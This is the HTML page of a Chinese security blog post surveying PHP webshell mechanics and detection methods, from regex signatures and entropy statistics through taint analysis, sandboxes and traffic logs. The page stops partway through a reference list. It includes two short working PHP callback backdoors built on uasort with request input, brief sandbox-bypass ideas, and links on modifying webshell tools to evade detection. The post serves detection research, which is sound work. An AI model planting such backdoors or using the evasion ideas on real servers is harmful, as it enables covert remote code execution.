@@ -1,0 +1,591 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WebShell检测绕过之上·知己知彼 | Ulysses'Blog</title><meta name="keywords" content="WebShell"><meta name="author" content="Ulysses"><meta name="copyright" content="Ulysses"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="WebShell原理回顾Webshell的恶意性表现在它的实现功能上，是一段带有恶意目的的正常脚本代码。   这里仅对PHP的一句话木马进行分析，核心步骤如下：   数据传递 超全局变量：$_GET、$_POST、$_COOKIES、$_REQUEST、$_FILE、$_SERVER 从远程远程URL中获取数据：file_get_contents、curl、svn_checkout…（将需要执行的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebShell检测绕过之上·知己知彼">
+<meta property="og:url" content="https://plumeria.ltd/post/db07a2af.html">
+<meta property="og:site_name" content="Ulysses&#39;Blog">
+<meta property="og:description" content="WebShell原理回顾Webshell的恶意性表现在它的实现功能上，是一段带有恶意目的的正常脚本代码。   这里仅对PHP的一句话木马进行分析，核心步骤如下：   数据传递 超全局变量：$_GET、$_POST、$_COOKIES、$_REQUEST、$_FILE、$_SERVER 从远程远程URL中获取数据：file_get_contents、curl、svn_checkout…（将需要执行的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://plumeria.ltd/img/cover/webshell1.png">
+<meta property="article:published_time" content="2021-12-20T11:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-23T15:12:41.943Z">
+<meta property="article:author" content="Ulysses">
+<meta property="article:tag" content="WebShell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://plumeria.ltd/img/cover/webshell1.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://plumeria.ltd/post/db07a2af"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"0HPLBDYHPG","apiKey":"0c8875d1d08e28840a882f41ae37ed2e","indexName":"my blog","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'WebShell检测绕过之上·知己知彼',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-23 23:12:41'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    document.addEventListener('pjax:complete', detectApple)})(window)</script><link rel="stylesheet" href="/css/mycss.css"><style type="text/css">.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body{left:-66px!important}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover{left:0!important}</style><div class="aplayer" data-id="6997392079" data-server="netease" data-type="playlist" data-fixed="true" data-listFolded="false" data-order="random" data-preload="none"></div><link rel="stylesheet" href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/css/swiper.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiperstyle.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/tag_plugins.min.css" media="defer" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/carousel-touch.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">52</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover/webshell1.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ulysses'Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">WebShell检测绕过之上·知己知彼</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-20T11:00:00.000Z" title="发表于 2021-12-20 19:00:00">2021-12-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-23T15:12:41.943Z" title="更新于 2021-12-23 23:12:41">2021-12-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">代码执行与命令执行</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="WebShell检测绕过之上·知己知彼"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="WebShell原理回顾"><a href="#WebShell原理回顾" class="headerlink" title="WebShell原理回顾"></a>WebShell原理回顾</h2><p>Webshell的恶意性表现在它的实现功能上，是一段带有恶意目的的正常脚本代码。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/16/ImEtjUqTlXvcb3w.png" alt="Untitled Diagram.drawio (4)"></p>
+<blockquote>
+<p>这里仅对PHP的一句话木马进行分析，核心步骤如下：</p>
+</blockquote>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/17/NmEFZ5ueYtolC82.png" alt="Untitled Diagram.drawio (8)"></p>
+<h4 id="数据传递"><a href="#数据传递" class="headerlink" title="数据传递"></a>数据传递</h4><ul>
+<li>超全局变量：<code>$_GET</code>、<code>$_POST</code>、<code>$_COOKIES</code>、<code>$_REQUEST</code>、<code>$_FILE</code>、<code>$_SERVER</code></li>
+<li>从远程远程URL中获取数据：<code>file_get_contents</code>、<code>curl</code>、<code>svn_checkout</code>…（将需要执行的指令数据放在远程URL中，通过<code>URL_INCLUDE</code>来读取）</li>
+<li>从本地磁盘文件中获取数据： <code>file</code>、<code>file_get_contents</code>…（将需要执行的指令数据放在本地磁盘文件中，利用IO函数来读取）</li>
+<li>从数据库中读取（将需要执行的指令放在数据库中，利用数据库函数来读取）</li>
+<li>从图片头部中获取： <code>exif_read_data</code>…（将需要执行的指令数据放在图片头部中，利用图片操作函数来读取）</li>
+</ul>
+<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><ul>
+<li>命令执行类：通过<code>eval</code>、<code>assert</code>、<code>system</code>、<code>create_function</code>等函数来执行命令/代码</li>
+<li>动态构造类：在php支持的动态构造函数中调用执行命令 </li>
+<li>preg类：正则系列函数可以使用<code>/e</code>模式正则来执行命令</li>
+<li>回调函数类：利用回调函数构造的Webshell，覆盖所有的<code>callable</code>类型参数</li>
+<li>反射函数类：利用<code>ReflectionFunction</code>等类，以及对应的invoke等方法执行命令</li>
+<li>文件包含类：<code>include</code>、<code>include_once</code>、<code>require</code>、<code>require_once</code>、<code>file_get_contents</code></li>
+</ul>
+<h2 id="WebShell主流检测手段"><a href="#WebShell主流检测手段" class="headerlink" title="WebShell主流检测手段"></a>WebShell主流检测手段</h2><h3 id="基于正则文本特征"><a href="#基于正则文本特征" class="headerlink" title="基于正则文本特征"></a>基于正则文本特征</h3><p>初期对付Webshell基本上都是这种方案，根据已知Webshell使用的函数和参数，使用正则表达式制定相应的黑名单规则。</p>
+<p>正则表达式检测法最早被广泛应用，但由于正则文法表达能力不足，以及当前WebShell混淆技术的成熟，导致基于正则的特征选择极易被绕过。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/15/BxcdOAnqI97N5JR.png" alt="image-20211215224718872"></p>
+<blockquote>
+<p>上图检测脚本可以通过以下链接复制：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fsdzsec/article/details/53147794">https://blog.csdn.net/fsdzsec/article/details/53147794</a></p>
+</blockquote>
+<h3 id="基于统计特征"><a href="#基于统计特征" class="headerlink" title="基于统计特征"></a>基于统计特征</h3><p>之后为了对付混淆，人们把视野放到了统计学上，通过统计文本熵，字符串长度，特殊符号个数，重合指数，压缩比等信息制定告警阈值，在对付混淆上有一定的威力。之后随着机器学习的兴起，阈值设置就交给了算法。</p>
+<p>Webshell由于往往经过了编码和加密，会表现出一些特别的统计特征，根据这些特征统计学习。但是这种方式着眼于全局，无法顾及局部细节，将混淆的恶意代码插入到正常文件中，基本上就失效了。</p>
+<p>所以实践发现这种方法应该只能适用于大马和加密马的检测。</p>
+<p>典型的代表:</p>
+<ul>
+<li><p>NeoPI（<a target="_blank" rel="noopener" href="https://github.com/CiscoCXSecurity/NeoPI）">https://github.com/CiscoCXSecurity/NeoPI）</a></p>
+</li>
+<li><p>ShellDaddy（<a target="_blank" rel="noopener" href="https://gitee.com/tdifg/shelldaddy）。算法部分主要借鉴了">https://gitee.com/tdifg/shelldaddy）。算法部分主要借鉴了</a> NeoPI 以及趋势科技开源出来的 TLSH。</p>
+</li>
+</ul>
+<p>使用的检测方法：    </p>
+<ul>
+<li><strong>信息熵（Entropy）</strong>：通过计算文本ASCII码表的总体熵值来衡量文件的不确定性</li>
+<li><strong>最长单词（LongestWord）</strong>：最长的字符串可能表示潜在的被编码或被混淆</li>
+<li><strong>重合指数（Indexof Coincidence）</strong>：低重合指数指示文件代码潜在的被加密或被混效过</li>
+<li><strong>特征（Signature）</strong>：在文件中搜索已知的恶意代码字符串片段</li>
+<li><strong>压缩（Compression）</strong>：文件的压缩比指示潜在的编码对抗行为</li>
+<li><strong>文件的重合指数（IC）</strong>：种方式可以用来判断文件的加密可能性。</li>
+<li><strong>特殊字符串比重</strong>：比如一个文件中像^ ~ 等等不常用的符号出现的频率超过一定的值可判断文件是webshell的可疑程度。</li>
+<li><strong>TLSH</strong>：一种新型的模糊 hash 算法，经过测试对比发现比 ssdeep 的速度快了接近一倍。不过有个问题就是不支持太小的文件。</li>
+<li><strong>简易模型</strong>：引入算法是为了补充规则在覆盖率上的不足，但是以上的算法除了 TLSH 算法之外 ，如果单独使用都会存在误报，所以ShellDaddy引入了一个简单的朴素贝叶斯模型，每种算法各占一些权重。</li>
+</ul>
+<h3 id="基于AST语法树"><a href="#基于AST语法树" class="headerlink" title="基于AST语法树"></a>基于AST语法树</h3><p>抽象语法树(AST)是一种将原始Webshell文本转换为抽象语法结构的树状表示的一种方法。AST语法树弥补了统计特征的不足，进一步深化，进行语法检测，关注于每个函数和参数，这种方式精确，误报较少。</p>
+<p>对于Webshell这种实时编译并执行的语言来说，抽象语法树结构本质上是另一个新的中间语言形态的数据结构，基本过程入下图所示：</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/16/GT5orasnZ31KOmj.png" alt="Untitled Diagram.drawio (5)"></p>
+<blockquote>
+<p>这里使用一个基于PHP-Praser生成AST的工具，我找了很久没找到原作者，就索性放到我的github上了。</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/UlyssesTakusen/vendor">https://github.com/UlyssesTakusen/vendor</a></p>
+</blockquote>
+<p>基于上述特征的WebShell检测方法已经能很好的识别Java类的WebShell。但是对于PHP这种动态特性很多的语言，检测就比较吃力，AST是无法了解语义的。</p>
+<h3 id="动-静态符号执行"><a href="#动-静态符号执行" class="headerlink" title="动/静态符号执行"></a>动/静态符号执行</h3><p>现在市面上大部分的WebShell查杀引擎都是基于这种方式去检测的。其本质上是数据流特征分析（污点分析），通过给<code>$_GET</code>、<code>$_POST</code>等输入参数打污点的方式，通过污点数据流是否流入敏感函数，来判断是否可疑。大体上有静态和动态两种。</p>
+<h4 id="静态污点分析"><a href="#静态污点分析" class="headerlink" title="静态污点分析"></a>静态污点分析</h4><p>静态污点分析过程可以分为三个部分，首先发现<code>eval</code>危险函数，之后追踪<code>eval</code>参数<code>$a</code>，发现是在函数test中，然后再跟踪test函数的调用信息，最后锁定调用参数是否外部可控。</p>
+<p>典型例子：<a target="_blank" rel="noopener" href="https://github.com/opensec-cn/chip">https://github.com/opensec-cn/chip</a></p>
+<h4 id="动态污点分析"><a href="#动态污点分析" class="headerlink" title="动态污点分析"></a>动态污点分析</h4><p>动态模拟执行部分是基于参数赋值+污点分析的方式实现的。通过在运行时对外界参数进行模拟赋值的方式，可以将模拟值（Source点）标记为污点数据，通过追踪污点数据相关的信息是否流向敏感函数（Sink点），以此来发现可通过外界参数控制敏感函数参数的风险行为。</p>
+<p>典型例子：<a target="_blank" rel="noopener" href="https://github.com/laruence/taint">https://github.com/laruence/taint</a></p>
+<h4 id="污点传递理论概述"><a href="#污点传递理论概述" class="headerlink" title="污点传递理论概述"></a>污点传递理论概述</h4><p>污点传递、或者说污点追踪，是一个泛概念，它在不同的应用领域都可以发挥良好的作用。</p>
+<p>一般来说，污点分析可以抽象成一个三元组的形式，其中</p>
+<ul>
+<li><strong>source 即污点源</strong>，代表直接引入不受信任的数据或者机密数据到系统中。</li>
+<li><strong>sink 即污点汇聚点</strong>，代表直接产生安全敏感操作（违反数据完整性）或者泄露隐私数据到外界（违反数据保密性）。</li>
+<li><strong>processor 即数据流处理</strong>，代表整个数据传输和处理的过程（例如加密、编码处理），外部输入的数据经过processor处理后会得到一个适合软件核心模块处理的数据形式。</li>
+</ul>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/16/ByL5mp18iXYKnvf.png" alt></p>
+<h4 id="以PHP为例的污点传递过程"><a href="#以PHP为例的污点传递过程" class="headerlink" title="以PHP为例的污点传递过程"></a>以PHP为例的污点传递过程</h4><p>污点分析就是分析程序中由污点源引入的数据，在经过数据流处理后，传播到污点汇聚点后，是否符合预设的策略。这里的策略是一个泛概念，例如：</p>
+<ul>
+<li>污点直接被传入了危险的函数中（例如eval）</li>
+<li>污点未经编码和转义处理，传入了输出函数中（例如xss漏洞）</li>
+</ul>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/17/Uo4LhH2K7Z89pkE.png" alt="Untitled Diagram.drawio (7)"></p>
+<p> 例如，如下WebShell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line">	<span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="number">2</span>);</span><br><span class="line">	uasort(<span class="variable">$arr</span>, <span class="variable">$func</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这是一个有攻防经验的人很容易看出的回调后门，但因为没有包含<code>eval</code>、<code>assert</code>之类的敏感语句或其它敏感的类方法，计算机难以识别。</p>
+<p>但人类可以快速识别，运用逻辑分析能力将上面的代码分析成两个步骤：</p>
+<ol>
+<li>用户可控参数被传入到了<code>uasort</code>函数的第2个参数中</li>
+<li><code>uasort</code> 函数的第2个参数为callable类型</li>
+</ol>
+<p>按照如下规则将其绘制成图：</p>
+<ul>
+<li>所有标识符都对应一个结点</li>
+<li>函数调用以及函数参数都分别对应一个结点</li>
+<li>如果标识符之间存在数据传递，则按照数据传递方向给结点连边</li>
+</ul>
+<p>我们会看到一张清晰的有向图：</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/17/M3W6wzKDnQGuXsS.png" alt="image-20211217002809014"></p>
+<p>这张图中存在一条从绿色<strong>用户可控变量</strong>经过蓝色其他变量传递，最终到达红色<strong>动态特性数据结点</strong>的路径。</p>
+<p>假如，我们再多加入参数传递和函数调用会变成什么样呢？</p>
+<p>例如，如下WebShell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="number">2</span>);</span><br><span class="line">    uasort(<span class="variable">$arr</span>, <span class="variable">$x</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> h(<span class="variable">$x</span>);	        </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> g(<span class="variable">$x</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$func</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span> = [<span class="variable">$b</span>];</span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$c</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">f[<span class="variable">$e</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现随着代码行数的增加，靠人眼分析已经有点困难了。</p>
+<p>那么，要是将其绘制成一个有向图呢？</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/17/KBDMArzFGPsy7mZ.png" alt="image-20211217003833467"></p>
+<p>发现无论怎么假如参数传递、函数调用，这条从<strong>用户可控端</strong>（绿色方框）到<strong>危险函数参数</strong>（红色方框）的路径都会存在。因为这份代码无论怎么修改，本质都是将用户输入的数据传递到<code>uasort</code>函数的参数中，来控制执行任意代码。</p>
+<p>其实这种基于将代码审计的经验映射到有向图的特征中，让程序自动化地提取这些特征并进行分析，便是大部分的WebShell查杀引擎的检测方法。</p>
+<h3 id="基于机器学习-深度学习"><a href="#基于机器学习-深度学习" class="headerlink" title="基于机器学习/深度学习"></a>基于机器学习/深度学习</h3><p>主要目标是生成样本在解释执行过程中的行为序列，使用运行行为序列来建立词袋模型，最终对这个词袋模型进行训练和测试。</p>
+<p>以PHP脚本为例，有两种类型的运行序列：</p>
+<ol>
+<li>利用VLD编译源码得到的OPCODE序列</li>
+<li>通过Zend OPCODE劫持实现的Runtime OPCODE序列。</li>
+</ol>
+<p>由于这个需要大量的Webshell样本训练，目前来看效果可能还是不太好。而有些算法可解释性比较差，不利于运营。而且存在大量误报的可能。这种检测方式仅仅用于少量云查杀引擎中。</p>
+<h3 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h3><p>动态沙箱和静态分析在流程上大同小异。主要区别在于，利用污点追踪技术，沙箱实现了对用户输入的追溯，并能真实执行目标代码。同时沙箱还能收集样本的实时行为并打上标签，如命令执行后门（HEUR.WebShell.Exec）、中国菜刀（HEUR.WebShell.Chopper）等，从而能做出更准确的判断。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/23/JCkY1lrZ368Seux.png" alt="image-20211223221352383"></p>
+<p>显然，沙箱的绕过方法要远远少于静态分析，主要原因还是沙箱真实执行了静态分析中没有分析到位的部分，真正将代码run了起来，使得打断污点传播变得极为困难。</p>
+<p>但即使如此，也依然存在绕过可能，除了和静态分析同样对sink和source不覆盖问题，还可以从以下方面考虑。</p>
+<ul>
+<li>随机行为绕过</li>
+<li>利用定时/延时绕过</li>
+<li>文件信息不对称绕过</li>
+</ul>
+<h3 id="流量日志检测"><a href="#流量日志检测" class="headerlink" title="流量日志检测"></a>流量日志检测</h3><p>这种检测技术属于统计机器学习方法，通过对HTTP访问日志中的URL作为聚类主键，结合攻防领域经验，生成一系列的统计特征。典型的特征如图所示：</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2021/12/17/wlnqOHL4MmdQpWU.png" alt="图片1"></p>
+<blockquote>
+<p>针对修改WebShell管理工具的流量特征这里就不展开讲解了。</p>
+<p>可以参考以下几篇文章：</p>
+<p>魔改 - 蚁剑：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.3hack.com/tools/33.html">改造中国蚁剑AntSword之轻松过狗 - 3HACK</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.shangmayuan.com/a/90cf91a73e554fd2a2da6171.html">蚁剑原理与魔改 - 尚码园 (shangmayuan.com)</a></p>
+</li>
+</ul>
+<p>魔改 - 冰蝎：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hbBKQRaMg-b68lJ9k8Rh4A">冰蝎，从入门到魔改 (qq.com)</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://mayoterry.com/index.php/archives/behinder_detect.html">在主机侧检测冰蝎3.0及哥斯拉 - mayoterry</a></p>
+</li>
